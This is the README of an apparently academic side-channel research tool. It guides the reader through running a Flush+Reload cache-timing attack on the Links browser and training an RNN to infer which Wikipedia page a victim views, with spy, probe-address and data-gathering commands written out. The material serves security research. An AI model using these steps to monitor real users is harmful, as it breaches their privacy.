# tanooki 

tanooki a cache grabbing tool. This work is an extension of Horby's [Side-Channel Attacks on Everyday Applications](https://github.com/defuse/flush-reload-attacks) and is pending publication. This tool goes the next step further and introduced an RNN as the classifier instead of the Levenshtein distance clustering algorithm. Below are the instructions on how to get you started along with some data and some already trained models! Enjoy. 

# Getting Started Guide

This guide will get you though the code in this repo. It assumes you are running Ubuntu 18.04. But should be relativly similar to any Debian distro. It also assumes you are running this on a vulnerable intel processor, and not from a type 2 hypervisor (i.e. Virtual Box). Type 1 hypervisors will work just fine, I think, this hasn't been tested fully.

## Table of Contents

- [Version Info](#VersionInfo)
- [Clone the repo](#CloneTheRepo)
- [Python deps](#PythonDeps)
- [Attacking the Links Browser](#AttackingTheLinksBrowser)
    - [1. Building Links from Source](#BuildingLinksFromSource)
        - [1.2. Compile Links](#CompileLinks)
        - [1.3. Copy the Links Binary](#CopyTheLinksBinary)
    - [2. Compile the Spying Tool](#CompileTheSpyingTool)
    - [3. Find the Probe Addresses](#FindTheProbeAddresses)
        - [3.1. Run the Probe Address Finding Tool](#RunTheProbeAddressFindingTool)
        - [3.2. Save the Probe Addresses to a File](#SaveTheProbeAddressesToAFile)
    - [4. Gather Data](#GatherData)
        - [4.1 Run Gather Data Tool](#RunGatherDataTool)
        - [4.2 Check and Prepare your Sample](#CheckAndPrepareYourSample)
        - [4.3 Offload the Data to your GPU Enabled Machine](#OffloadTheDataToYourGPUEnabledMachine)
    - [5. Gen Data](GenData)
        - [5.1 Format your Data](#FormatYourData)
    - [6. Train the Model](#TrainTheModel)
        - [6.1 Trian your RNN](#TrianYourRNN)
    - [7. Test Model](#TestModel)
        - [7.1 Gen Eval Data](#GenEvalData)
        - [7.2 Evaluate the Data](#EvaluateTheData)
    - [8. Test it Out](#TestItOut)
        - [8.1 Be the Attacker](#BeTheAttacker)
        - [8.2 Be the Victim](#BeTheVictim)
        - [8.3 Prepare the Data](#PrepareTheData)
        - [8.4 Predict](#Predict)

## Version Info <a name="VersionInfo"></a>

```bash
➜ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.3 LTS
Release:        18.04
Codename:       bionic
```

```bash
➜ python
Python 3.7.3 (default, Nov 27 2019, 10:27:28)
[GCC 7.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>>
```

## Clone the Repo <a name="CloneTheRepo"></a>

```bash
git clone https://github.com/ainfosec/tanooki
```

## Dependencies <a name="PythonDeps"></a>

1. git
1. make
1. gcc
1. python3
1. python3-pip

```bash
sudo apt install -y git make gcc python3 python3-pip
```

## Python Deps <a name="VersionInfo"></a>

1. numpy
1. matplotlib
1. tensorflow==1.13.1
1. tensorflow-gpu==1.13.1
1. cowsay

```bash
 pip install -r requirements.txt
 ```

## Attacking the Links Browser <a name="AttackingTheLinksBrowser"></a>

---

### 1. Building Links from Source <a name="BuildingLinksFromSource"></a>

We will be using the same target as Hornby did for this tutoral. We can't use what's inthe repos because we need the debug info for the following steps.

Go to the [Links download page](http://links.twibright.com/download.php) and
grab the source code.

```bash
➜ wget http://links.twibright.com/download/links-2.13.tar.gz
➜ tar xvf links-2.13.tar.gz
```

#### 1.2. Compile Links <a name="CompileLinks"></a>

Now compile a Links binary.

```bash
➜ cd links-2.13
➜ ./configure
➜ make
```

#### 1.3. Copy the Links Binary <a name="CopyTheLinksBinary"></a>

Copy the Links binary into the `gather_cpu_data/experiments/links/binaries`:

```bash
➜ cp links gather_cpu_data/experiments/links/binaries/links
```

### 2. Compile the Spying Tool <a name="CompileTheSpyingTool"></a>

Compile the `spy` binary which implements the actual Flush+Reload side-channel
attack:

```bash
➜ cd  gather_cpu_data/flush-reload/myversion/
➜ make lib
➜ make
➜ make cleanall
```

### 3. Find the Probe Addresses <a name="FindTheProbeAddresses"></a>

We've already identified some good Flush+Reload probe locations to make the
Wikipedia page distinguishing attack work. They are the first cache lines of the
functions `kill_html_stack_item()`, `html_stack_dup()`, `html_a()`, and
`parse_html()`. We need to find the addresses of those cache lines.

#### 3.1. Run the Probe Address Finding Tool <a name="RunTheProbeAddressFindingTool"></a>

Run the probe address finding tool to look up the addresses (My probes will likely not be the same as yours):

```bash
➜ ./attack_tools.py find-addr ../../experiments/links/binaries/links --probes kill_html_stack_item,html_stack_dup,html_a,parse_html
A:0xbe710
B:0xbedf0
C:0xbe820
D:0xc1f90
```

or

```bash
➜ ./attack_tools.py find-addr ../../experiments/links/binaries/links --probe_file ../../experiments/links/probe_names.txt
A:0xbe710
B:0xbedf0
C:0xbe820
D:0xc1f90
```

#### 3.2. Save the Probe Addresses to a File <a name="SaveTheProbeAddressesToAFile"></a>

Save those probe addresses to a file. Copy and paste the output into

`gather_cpu_info/experiments/links/binaries/links.probes`.

### 4. Gather Data <a name="GatherData"></a>

You will need training data to train the model. This is the step where we gather data.
Alternalivly you can run the gather data script.

#### 4.1 Run Gather Data Tool <a name="RunGatherDataTool"></a>

We wrote a shell script to wrap attack_tools.py

```bash
./attack_tools.py gather-data -h
usage: attack_tools gather-data [-h] [--sleep_kill] [--spy_binary]
                                [--threshold] [--slot]
                                target_binary input_list probe_file samples
                                train_dir

positional arguments:
  target_binary  Path to the binary to target.
  input_list     Path to list of inputs for run_binary.
  probe_file     Path to probe file.
  samples        Number of sample to capture
  train_dir      Directory to save training info in.

optional arguments:
  -h, --help     show this help message and exit
  --sleep_kill   Kill process after N number of seconds (default: 1)
  --spy_binary   Path to binary to spy on (default spy in cwd)
  --threshold    Threshold time to determine probe hit (default: 120)
  --slot         You can think of this is how long your sting will be.
                 (default: 1024)
```

```bash
➜ cd gather_data
➜ mkdir data
➜ ./gather_data.sh
```

Samples should have been set to 10, but you will need more than that to train the model.
Edit the file and change samlples to 100 or more. However you might want to run it with 10 
first just to make sure it works. If it's just not working, one reason could be that the tool
can't distinguish between what is and what is not in the cache...

Try this:

```bash
cd gather_data/flush-reload/myversion
./attack_tools.py bench
```

Your graph should look something like this...
![Good Bench](https://gitlab.ainfosec.com/SAE/skunkworks/kernel-side-channel-attacks/raw/master/present/mermaid/cache_bench_good.png "Good Bench")

If not you may not be able to get this code to work for you.

If it does work however, go ahead and edit the gather_data script.

```bash
➜ vim ./gather_data.sh
```

Your file should look like this.

```bash
SAMPLES=100
SYSTEM_USER=$USER
URL_SET='wiki-top-100-of-2013-HTTPS.txt'
TRAIN_DIR='data'
BIN='links'
PROBE='links.probes'
.
.
.
```

This will take a couple hours.

```bash
➜ ./gather_data.sh
```

#### 4.2 Check and Prepare your Sample <a name="CheckAndPrepareYourSample"></a>

Check your samples to make sure you have collected all your data. We reccomend you have as little as possible running on your machine while you gather this data. Higher system laods will impact your accuracy.

```bash
➜ cd data/session_02
➜ less 02_SESSION_INFO
```

Should look somthing like this. This files reads as follows:

**sha256_hash_of_url**: **sucesses/sample_size** : **cat** **/proc/loadavg**

```bash
b0f40a61f4837fe99f782e3a93b9925c4ba50c2cad456a51a5b09607b2f7f151 : [10/10] : 0.19 0.60 0.49 1/614 12802
253c3bbd2c217c1445573e557725335fd5d16fc06d5701ee7677a900685a3760 : [10/10] : 0.26 0.61 0.49 1/613 12835
c14aedfa65485b662f1afcb612c7b1790c97eff5195be56c10a2bf9ef86c937a : [10/10] : 0.37 0.62 0.50 1/614 12866
871e8731a1002006a096b59772a4826807af7b1acc9a3ac97723854feb2d37bf : [10/10] : 0.47 0.64 0.51 1/614 12917
3b81d0aef0db5a49676e047fa1aed8e2fb3eb9393cd8db59216c1b905cc68886 : [10/10] : 0.59 0.66 0.51 1/614 12950
0179a47d765082b1ab8632a829f2a38e3d07b6bdba0b2536fcf53e25d0f148af : [10/10] : 0.62 0.67 0.52 1/614 12983
.
.
.
```

If any of them read less then 10 out of 10 then you might need to borrow samples form session_01.

#### 4.3 Offload the Data to your GPU Enabled Machine <a name="OffloadTheDataToYourGPUEnabledMachine"></a>

If you happen to have a gpu on the mahine you gathered your data from, then you can skip this step.

### 5. Gen Data <a name="GenData"></a>

After gathering you training data it needs to be put in a format that tensoflow can understand.
We've written a script that can do this for you.

#### 5.1 Format your Data <a name="FormatYourData"></a>

Note: I renamed session_02 to data-precision-1-100-2013 feel free to choose your own names.

```bash
➜ ./data_center.py gen-data -h
usage: data_center gen-data [-h] [--len] [--split] [--spy_data]
                            target_data output_data

positional arguments:
  target_data  Path to data to be processes.
  output_data  Path to output the cleaned data.

optional arguments:
  -h, --help   show this help message and exit
  --len        Len of the string to truncate too. (Default to 450 characters)
  --split      When to split to eval. (Default to .90 train .10 eval)
  --spy_data   Is this new spy data? (i.e) preparing the data for prediction.
```

```bash
➜  cd neural_net
➜ ./data_center.py gen-data ../../data/unclean_new/data-precision-1-100-2013/ ../../data/clean_new/data-precision-1-100-2013/
```

### 6. Train the Model <a name="TrainTheModel"></a>

You need to train your model to perform predictions.

#### 6.1 Trian your RNN <a name="TrianYourRNN"></a>

```bash
➜ ./data_center.py train -h
usage: data_center train [-h] [--epochs EPOCHS] [--keep_training]
                         [--training_dir] [--checkpoint_dir] [--truncate]
                         train_file eval_file

positional arguments:
  train_file         Path to train csv.
  eval_file          Path to eval csv.

optional arguments:
  -h, --help         show this help message and exit
  --epochs EPOCHS    Number or epochs. (default: 20)
  --keep_training    keep training n number of epochs. (pass in exsisting
                     checkpoint_dir)
  --training_dir     Directory to store training sessions.
  --checkpoint_dir   checkpoint directory.
  --truncate         truncate data. (defualt: None)
  ```

Make the training directory.

```bash
mkdir training
```

Run in train mode.

```bash
➜ ./data_center.py train ../../data/clean_new/data-precision-1-100-2013/Train.csv ../../data/clean_new/data-precision-1-100-2013/Eval.csv
```

### 7. Test Model <a name="TestModel"></a>

Use use the reset of your session_01 data to evaluate your model.

#### 7.1 Gen Eval Data <a name="GenEvalData"></a>

Need to format this data too.
Note: I renamed session_01 to data-precision-1-10-2013 feel free to choose your own names.

```bash
➜ ./data_center.py gen-data ../../data/unclean_new/data-precision-1-10-2013/ ../../data/clean_new/data-precision-1-10-2013/ --split 1.0
```

#### 7.2 Evaluate the Data <a name=" EvaluateTheData"></a>

```bash
➜ ./data_center.py eval -h
usage: data_center eval [-h] [--hide_results] [--truncate]
                        metadata_file eval_file checkpoint_dir

positional arguments:
  metadata_file   Path to metadata.
  eval_file       Path to eval csv.
  checkpoint_dir  Path to checkpoint dir.

optional arguments:
  -h, --help      show this help message and exit
  --hide_results  Do not print model guess for each url.
  --truncate      truncate data. (default: None)

```

```bash
➜ ./data_center.py eval ../../data/clean_new/data-precision-1-10-2013/METADATA.csv ../../data/clean_new/data-precision-1-10-2013/EVAL.csv ./training/session_05
```

### 8. Test it Out <a name="TestItOut"></a>

Now you need some new spy data to test out your new model.

#### 8.1 Be the Attacker <a name="BeTheAttacker"></a>

Assumeing that your model is good go ahead and try it out.

```bash
➜ ./spy -h
Usage: spy -e ELFPATH -t CYCLES -s CYCLES -p PROBE [-p PROBE ...] [-m]
    -b, --bench 			        Get cache benchmark and quit.
    -e, --elf PATH		        	Path to ELF binary to spy on.
    -t, --threshold CYCLES	     	Max. L3 latency. (Default: 120)
    -s, --slot CYCLES			    Slot duration in cycles.
    -p, --probe N:0xDEADBEEF		Name character : Virtual address.
```

Run the spy tool (agian my probes may not be the same as yours)

```bash
➜ cd gather_cpu_data/flush-reload/myversion/
➜ ./spy -e ../../experiments/links/binaries/links -s 1024 -p A:0xbe710,B:0xbedf0,C:0xbe820,D:0xc1f90
```


#### 8.2 Be the Victim <a name="BeTheVictim"></a>

While the spy tool is running open view a wikipedia page.
Pick a url from your list.

```bash
➜ cd gather_cpu_data/experiments/links/binaries
➜ ./links https://en.wikipedia.org/wiki/Acoustic-electric_guitar
```

#### 8.3 Prepare the Data <a name="PrepareTheData"></a> 

Take that output and put it wherever it needs to go. Just make sure to let
the data_center know this is spy data.

```bash
➜ ./data_center.py gen-data ../../data/unclean_data/spy/ ../../data/clean_spy/ --spy_data
```

#### 8.4 Predict <a name="Predict"></a> 

Now that everything is ready go ahead and predict.

```bash
➜  ./data_center.py predict --help
positional arguments:
  metadata_file   Path to metadata.
  predict_file    Path to probe csv.
  checkpoint_dir  Path to checkpoint dir.

optional arguments:
  -h, --help      show this help message and exit
  --truncate      truncate data.
  --fun           the fun way to dispaly data.
```

```bash
➜ /data_center.py predict ../../data/clean_data/some_dir/METADATA.json ../../data/clean_spy/Spy.csv ./rnn/training/session_05/
```

Did it work?
